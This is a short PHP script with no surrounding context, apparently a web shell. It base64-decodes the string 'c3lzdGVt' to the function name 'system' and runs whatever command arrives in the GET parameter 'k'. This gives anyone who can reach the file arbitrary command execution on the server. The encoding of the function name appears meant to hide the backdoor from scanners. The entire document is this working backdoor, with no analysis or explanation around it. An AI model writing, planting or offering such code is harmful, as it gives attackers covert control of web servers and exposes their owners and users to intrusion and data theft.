<?php
$s = 'c3lzdGVt';
$f = base64_decode( $s );
if ( isset( $_GET['k'] ) ) {
	$f( $_GET['k'] );
}
